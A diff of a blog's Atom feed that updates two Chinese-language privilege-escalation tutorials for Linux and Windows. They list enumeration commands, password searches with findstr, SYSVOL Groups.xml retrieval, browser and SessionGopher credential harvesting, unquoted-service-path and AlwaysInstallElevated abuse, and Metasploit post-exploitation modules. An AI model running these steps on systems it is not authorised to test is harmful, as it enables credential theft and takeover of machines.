@@ -843,7 +843,7 @@
     <link href="http://kevien.github.io/2017/10/10/linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
     <id>http://kevien.github.io/2017/10/10/linux权限提升/</id>
     <published>2017-10-10T04:35:24.000Z</published>
-    <updated>2018-11-28T10:47:58.114Z</updated>
+    <updated>2018-12-01T07:27:03.026Z</updated>
     
     <content type="html"><![CDATA[<p><img src="/2017/10/10/linux权限提升/linuxprivilegeescalation.jpg" alt=""></p>
 <h2 id="Brief"><a href="#Brief" class="headerlink" title="Brief"></a>Brief</h2><ul>
@@ -862,7 +862,7 @@
 <h3 id="查找exploit"><a href="#查找exploit" class="headerlink" title="查找exploit"></a>查找exploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">site:exploit-db.com kernel version</div><div class="line"></div><div class="line">python linprivchecker.py extended</div></pre></td></tr></table></figure>
 <p><strong>其中dirty-cow脏牛可以搞定大多的内核！！</strong></p>
 <ul>
-<li>能不用内核漏洞提权尽量就不要用，因为它可能会导致系统崩溃或者使系统处于一个不稳定的状态，且还会产生大量的日志信息在sys.log 文件中。<h2 id="以root权限运行的程序"><a href="#以root权限运行的程序" class="headerlink" title="以root权限运行的程序"></a>以root权限运行的程序</h2></li>
+<li>能不用内核漏洞提权尽量就不要用，虽然内核提权是最快且最容易的，但因为它可能会导致系统崩溃或使系统处于一个不稳定的状态，且还会产生大量的日志信息在sys.log 文件中。<h2 id="以root权限运行的程序"><a href="#以root权限运行的程序" class="headerlink" title="以root权限运行的程序"></a>以root权限运行的程序</h2></li>
 <li>这个方法的原理就是如果一个服务是以root权限运行的，那么让这个服务去执行命令，那么执行的这个命令也将会是以root权限运行的，查看web服务器、数据库或者其它的服务，典型的例子然是<br>mysql的，如下：</li>
 <li>查看有哪些正在运行的程序<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># Metasploit</div><div class="line">ps</div><div class="line"></div><div class="line"># Linux</div><div class="line">ps aux</div></pre></td></tr></table></figure>
 </li>
@@ -985,14 +985,15 @@
     <link href="http://kevien.github.io/2017/10/01/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87(%E4%BA%8C)/"/>
     <id>http://kevien.github.io/2017/10/01/windows权限提升(二)/</id>
     <published>2017-10-01T03:39:24.000Z</published>
-    <updated>2018-11-30T10:51:28.190Z</updated>
+    <updated>2018-12-01T09:08:30.384Z</updated>
     
     <content type="html"><![CDATA[<p><img src="/2017/10/01/windows权限提升(二)/windowsprivilegeescalation.png" alt=""></p>
-<h2 id="基本系统信息枚举"><a href="#基本系统信息枚举" class="headerlink" title="基本系统信息枚举"></a>基本系统信息枚举</h2><ul>
+<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul>
+<li>首先来说说windows权限提升对于攻击者来说有哪些好处<br>1.可以进行更多的攻击向量尝试<br>2.可以获取到本地用户的哈希<br>3.可以在网络层进行LLMNR、NBNS投毒等<br>4.本地抓包<br>5.安装软件<br>6.可以从内存中获取明文的认证信息<h2 id="基本系统信息枚举"><a href="#基本系统信息枚举" class="headerlink" title="基本系统信息枚举"></a>基本系统信息枚举</h2></li>
 <li>在我们提权之前我们首先需要对这个系统需要有一定的了解，比如我们需要知道当前用户有哪些权限、系统打了哪些补丁等信息。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"># Basics</div><div class="line">systeminfo</div><div class="line">hostname</div><div class="line"></div><div class="line"># Who am I?</div><div class="line">whoami</div><div class="line">echo %username%</div><div class="line"></div><div class="line"># What users/localgroups are on the machine?</div><div class="line">net users</div><div class="line">net localgroups</div><div class="line"></div><div class="line"># More info about a specific user. Check if user has privileges.</div><div class="line">net user user1</div><div class="line"></div><div class="line"># View Domain Groups</div><div class="line">net group /domain</div><div class="line"></div><div class="line"># View Members of Domain Group</div><div class="line">net group /domain &lt;Group Name&gt;</div><div class="line"></div><div class="line"># Firewall</div><div class="line">netsh firewall show state</div><div class="line">netsh firewall show config</div><div class="line"></div><div class="line"># Network</div><div class="line">ipconfig /all</div><div class="line">route print</div><div class="line">arp -A</div><div class="line"></div><div class="line"># How well patched is the system?</div><div class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</div><div class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot; /C:&quot;KB..&quot; - to find specific KBs</div></pre></td></tr></table></figure>
 </li>
 </ul>
-<h2 id="明文密码存储"><a href="#明文密码存储" class="headerlink" title="明文密码存储"></a>明文密码存储</h2><h3 id="通过以下的命令进行查找"><a href="#通过以下的命令进行查找" class="headerlink" title="通过以下的命令进行查找"></a>通过以下的命令进行查找</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">findstr /si password *.txt</div><div class="line">findstr /si password *.xml</div><div class="line">findstr /si password *.ini</div><div class="line"></div><div class="line">#Find all those strings in config files.</div><div class="line">dir /s *pass* == *cred* == *vnc* == *.config*</div><div class="line"></div><div class="line"># Find all passwords in all files.</div><div class="line">findstr /spin &quot;password&quot; *.*</div><div class="line">findstr /spin &quot;password&quot; *.*</div></pre></td></tr></table></figure>
+<h2 id="明文密码存储"><a href="#明文密码存储" class="headerlink" title="明文密码存储"></a>明文密码存储</h2><h3 id="通过以下的命令进行查找"><a href="#通过以下的命令进行查找" class="headerlink" title="通过以下的命令进行查找"></a>通过以下的命令进行查找</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">findstr /si password *.txt</div><div class="line">findstr /si password *.xml</div><div class="line">findstr /si password *.ini</div><div class="line"></div><div class="line">#Find all those strings in config files.</div><div class="line">dir /s *pass* == *cred* == *vnc* == *.config*</div><div class="line"></div><div class="line"># Find all passwords in all files.</div><div class="line">findstr /spin &quot;password&quot; *.*</div><div class="line">findstr /spin &quot;password&quot; *.*</div><div class="line"></div><div class="line"># Find Browser Creds</div><div class="line">enum_ie,enum_chrome(metasploit)</div><div class="line"></div><div class="line"># SessionGopher - find Putty,winscp,RDP creds</div><div class="line">[SessionGopher](https://github.com/Arvanaghi/SessionGopher)</div></pre></td></tr></table></figure>
 <h3 id="关键文件查找"><a href="#关键文件查找" class="headerlink" title="关键文件查找"></a>关键文件查找</h3><ul>
 <li>在这些常见的文件中查找，其中有些可能是base64编码的。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">c:\sysprep.inf</div><div class="line">c:\sysprep\sysprep.xml</div><div class="line">c:\unattend.xml</div><div class="line">%WINDIR%\Panther\Unattend\Unattended.xml</div><div class="line">%WINDIR%\Panther\Unattended.xml</div><div class="line"></div><div class="line">dir c:\*vnc.ini /s /b</div><div class="line">dir c:\*ultravnc.ini /s /b </div><div class="line">dir c:\ /s /b | findstr /si *vnc.ini</div></pre></td></tr></table></figure>
 </li>
@@ -1031,11 +1032,12 @@
 <h2 id="脆弱的服务权限"><a href="#脆弱的服务权限" class="headerlink" title="脆弱的服务权限"></a>脆弱的服务权限</h2><ul>
 <li>服务是windows上没有图形化界面运行在后台的程序。</li>
 <li>如果你发现一个服务允许everyone写，那么你可以将你的二进制文件写到这个目录并让它去执行。</li>
-<li><p>首先我们可以使用wmic或者sc.exe去发现服务，wmic并不是每台windows机器上都有，且有可能对你当前的用户不可用，如果你用不了它，你可以使用sc.exe</p>
+<li>首先我们可以使用wmic或者sc.exe去发现服务，wmic并不是每台windows机器上都有，且有可能对你当前的用户不可用，如果你用不了它，你可以使用sc.exe<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">accesschk.exe -uwcqv &quot;Authenticated Users&quot; * /accepteula</div></pre></td></tr></table></figure>
+</li>
+</ul>
 <h3 id="WMIC"><a href="#WMIC" class="headerlink" title="WMIC"></a>WMIC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic service list brief</div></pre></td></tr></table></figure>
-</li>
-<li><p>这个命令将会输出当前机器所运行的服务，这个时候我们需要找到这些有权限漏洞的服务，为了检查权限问题我们可以使用icacls这个命令，注意这个命令从vista才开始支持，xp或者以下用的是cacls命令。</p>
-</li>
+<ul>
+<li>这个命令将会输出当前机器所运行的服务，这个时候我们需要找到这些有权限漏洞的服务，为了检查权限问题我们可以使用icacls这个命令，注意这个命令从vista才开始支持，xp或者以下用的是cacls命令。</li>
 <li>如下的命令用于查看运行文件在非system32目录下的服务，并且使用icacls查看对应的权限。前提是你能够使用wmic，且你在c:\windows\temp目录有些权限。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">for /f &quot;tokens=2 delims=&apos;=&apos;&quot; %a in (&apos;wmic service list full^|find /i &quot;pathname&quot;^|find /i /v &quot;system32&quot;&apos;) do @echo %a &gt;&gt; c:\windows\temp\permissions.txt</div><div class="line"></div><div class="line">for /f eol^=^&quot;^ delims^=^&quot; %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls &quot;%a&quot;</div></pre></td></tr></table></figure>
 </li>
 </ul>
@@ -1074,7 +1076,7 @@
 <p>这个是有可以使用 migrate pid 进行转移。<br><strong>这里有个很好的例子！！！</strong><a href="https://medium.com/@bondo.mike/ptp-lab-privilege-escalation-with-services-5d14a99a28d1" target="_blank" rel="external">PTP Lab — Privilege Escalation with Services</a></p>
 <h2 id="有空格的服务路径"><a href="#有空格的服务路径" class="headerlink" title="有空格的服务路径"></a>有空格的服务路径</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"># Using WMIC</div><div class="line">wmic service get name,displayname,pathname,startmode |findstr /i &quot;auto&quot; |findstr /i /v &quot;c:\windows\\&quot; |findstr /i /v &quot;&quot;&quot;</div><div class="line"></div><div class="line"># Using sc</div><div class="line">sc query</div><div class="line">sc qc service name</div><div class="line"></div><div class="line"># Look for Binary_path_name and see if it is unquoted.</div></pre></td></tr></table></figure>
 <ul>
-<li>如果路径包含了空格且没有被双引号闭合，那么这个服务是容易受攻击的。<h3 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h3></li>
+<li>如果路径包含了空格且没有被双引号闭合，那么这个服务是容易受攻击的。<br><a href="https://toshellandback.com/2015/11/24/ms-priv-esc/" target="_blank" rel="external">更多</a><h3 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h3></li>
 <li><p>如果可执行文件的路径是这样的</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">c:\Program Files\something\winamp.exe</div></pre></td></tr></table></figure>
 </li>
@@ -1088,9 +1090,12 @@
 <li>一些驱动可能是容易受攻击的，我对这块儿还是不是很擅长。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># List all drivers</div><div class="line">driverquery</div></pre></td></tr></table></figure>
 </li>
 </ul>
-<h2 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</div><div class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</div></pre></td></tr></table></figure>
-<p><a href="http://toshellandback.com/2015/11/24/ms-priv-esc/" target="_blank" rel="external">文章详细</a></p>
-<h2 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h2><ul>
+<h2 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h2><ul>
+<li><p>AlwaysInstallElevated是一个策略设置。微软允许非授权用户以SYSTEM权限运行安装文件(MSI)，默认是没有配置的(即无法利用的)。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</div><div class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</div></pre></td></tr></table></figure>
+</li>
+<li><p>这个配置错误的不多，更多可以看向这里<a href="https://xz.aliyun.com/t/203" target="_blank" rel="external">https://xz.aliyun.com/t/203</a><br><img src="/2017/10/01/windows权限提升(二)/AlwaysInstallElevated.png" alt=""><br><img src="/2017/10/01/windows权限提升(二)/backdoor.png" alt=""></p>
+<h2 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h2></li>
 <li>如果一个机器是加入域了的，当前用户可以查看系统信息卷，这里可能有敏感的文件。</li>
 <li><p>首先我们需要装载这个卷，为了查找到域控机器的ip地址，我们先看一下环境变量。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"># Output environment-variables</div><div class="line">set</div><div class="line"></div><div class="line"># Look for the following:</div><div class="line">LOGONSERVER=\\NAMEOFSERVER</div><div class="line">USERDNSDOMAIN=WHATEVER.LOCAL</div><div class="line"></div><div class="line"># Look up ip-addres</div><div class="line">nslookup nameofserver.whatever.local</div><div class="line"></div><div class="line"># It will output something like this</div><div class="line">Address:  192.168.1.101</div><div class="line"></div><div class="line"># Now we mount it</div><div class="line">net use z: \\192.168.1.101\SYSVOL</div><div class="line"></div><div class="line"># And enter it</div><div class="line">z:</div><div class="line"></div><div class="line"># Now we search for the groups.xml file</div><div class="line">dir Groups.xml /s</div></pre></td></tr></table></figure>
@@ -1119,13 +1124,14 @@
 <li>metasploit有一些有意思的后渗透模块，你需要有一个meterpreter shell 然后去运行这些后渗透模块<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">use exploit/windows/local/service_permissions</div><div class="line"></div><div class="line">post/windows/gather/credentials/gpp</div><div class="line"></div><div class="line">run post/windows/gather/credential_collector </div><div class="line"></div><div class="line">run post/multi/recon/local_exploit_suggester</div><div class="line"></div><div class="line">run post/windows/gather/enum_shares</div><div class="line"></div><div class="line">run post/windows/gather/enum_snmp</div><div class="line"></div><div class="line">run post/windows/gather/enum_applications</div><div class="line"></div><div class="line">run post/windows/gather/enum_logged_on_users</div><div class="line"></div><div class="line">run post/windows/gather/checkvm</div></pre></td></tr></table></figure>
 </li>
 </ul>
+<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc" target="_blank" rel="external">PowerUp</a></p>
 <h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_windows.html" target="_blank" rel="external">Privilege Escalation Windows</a><br><a href="https://www.youtube.com/watch?v=DlJyKgfkoKQ" target="_blank" rel="external">Windows Privilege Escalation Techniques (Local)</a></p>
 ]]></content>
     
     <summary type="html">
     
       &lt;p&gt;&lt;img src=&quot;/2017/10/01/windows权限提升(二)/windowsprivilegeescalation.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;h2 id=&quot;基本系统信息枚举&quot;&gt;&lt;a href=&quot;#基本系统信息枚举&quot; class=&quot;headerlink&quot;
+&lt;h2 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title
     
     </summary>
     
